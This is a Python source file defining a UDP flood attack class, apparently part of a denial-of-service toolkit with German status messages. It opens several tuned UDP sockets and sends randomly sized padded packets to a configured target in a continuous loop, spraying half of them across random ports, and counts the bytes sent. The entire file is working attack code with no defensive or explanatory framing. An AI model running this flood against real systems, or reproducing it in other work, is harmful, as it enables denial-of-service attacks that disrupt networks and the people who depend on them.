import asyncio
import random
import socket
from src.attacks.base import AttackBase

class UdpFlood(AttackBase):
    async def setup(self):
        await super().setup()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if hasattr(socket, 'SO_ZEROCOPY'):
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_ZEROCOPY, 1)
        if hasattr(socket, 'SO_REUSEPORT'):
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    
    async def cleanup(self):
        self.sock.close()
        await super().cleanup()
    
    async def attack_loop(self):
        print("Starte UDP-Flood Angriff...")
        loop = asyncio.get_event_loop()
        additional_sockets = []
        try:
            for _ in range(min(10, self.config.threads // 2)):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                if hasattr(socket, 'SO_ZEROCOPY'):
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_ZEROCOPY, 1)
                if hasattr(socket, 'SO_REUSEPORT'):
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                sock.bind(('0.0.0.0', 0))
                additional_sockets.append(sock)
        except Exception as e:
            print(f"Fehler beim Erstellen zusätzlicher Sockets: {e}")
        all_sockets = [self.sock] + additional_sockets
        while not self.stop_event.is_set():
            sock = random.choice(all_sockets)
            packet_size = self._get_random_packet_size()
            payload = self._add_packet_padding(packet_size)
            target_port = random.randint(1, 65535) if random.random() < 0.5 else self.config.port
            if self.task_queue:
                await self.task_queue.put((
                    loop.sock_sendto,
                    (sock, payload, (self.config.target, target_port))
                ))
            else:
                await loop.sock_sendto(sock, payload, (self.config.target, target_port))
            self.stats.update_sent(1, packet_size + 28)
            await asyncio.sleep(0.001)
        for sock in additional_sockets:
            try:
                sock.close()
            except:
                pass
